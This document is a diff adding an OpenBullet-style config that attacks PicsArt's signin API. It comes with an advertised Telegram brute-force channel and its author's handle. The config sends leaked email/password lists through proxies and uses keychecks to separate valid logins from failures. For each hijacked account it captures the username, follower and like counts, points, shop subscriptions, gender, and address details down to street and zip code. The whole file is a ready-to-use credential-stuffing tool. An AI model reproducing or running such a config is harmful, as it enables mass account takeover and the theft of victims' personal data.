@@ -1,0 +1,97 @@
+[SETTINGS]
+{
+  "Name": "PicsArt",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-19T12:42:19.8805275+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | API IOS | Full Capture | CPM Rate: 500_2000",
+  "Author": "@TheOwn",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.picsart.com/users/signin.json" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"provider\":\"picsart\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.picsart.com" 
+  HEADER "User-Agent: PicsArt-10.x" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "username_or_password_incorrect" 
+    KEY "user_doesnt_exist" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"success\"," 
+
+#Uname PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "Username" 
+
+#Photos_Count PARSE "<SOURCE>" JSON "photos_count" CreateEmpty=FALSE -> CAP "Photos Count" 
+
+#Points PARSE "<SOURCE>" JSON "points" CreateEmpty=FALSE -> CAP "Points" 
+
+#Shop_Subscriptions PARSE "<SOURCE>" JSON "shop_subscriptions" CreateEmpty=FALSE -> CAP "Shop Subscriptions" 
+
+#TopFans_Count PARSE "<SOURCE>" JSON "top_fans_count" CreateEmpty=FALSE -> CAP "TopFans Count" 
+
+#Followers_Count PARSE "<SOURCE>" JSON "followers_count" CreateEmpty=FALSE -> CAP "Followers Count" 
+
+#Following_Count PARSE "<SOURCE>" JSON "following_count" CreateEmpty=FALSE -> CAP "Following Count" 
+
+#Likes_Count PARSE "<SOURCE>" JSON "likes_count" CreateEmpty=FALSE -> CAP "Likes Count" 
+
+#Stream_Count PARSE "<SOURCE>" JSON "streams_count" CreateEmpty=FALSE -> CAP "Stream Count" 
+
+#Gender PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "Gender" 
+
+#Country PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "Country" 
+
+#State PARSE "<SOURCE>" JSON "state" CreateEmpty=FALSE -> CAP "State" 
+
+#City PARSE "<SOURCE>" JSON "city" CreateEmpty=FALSE -> CAP "City" 
+
+#Street PARSE "<SOURCE>" JSON "street" CreateEmpty=FALSE -> CAP "Street" 
+
+#zip PARSE "<SOURCE>" JSON "zip" CreateEmpty=FALSE -> CAP "zip" 
+
+#CC FUNCTION Constant "T.me/BruteForce" -> CAP "Telegram Channel: " 
+
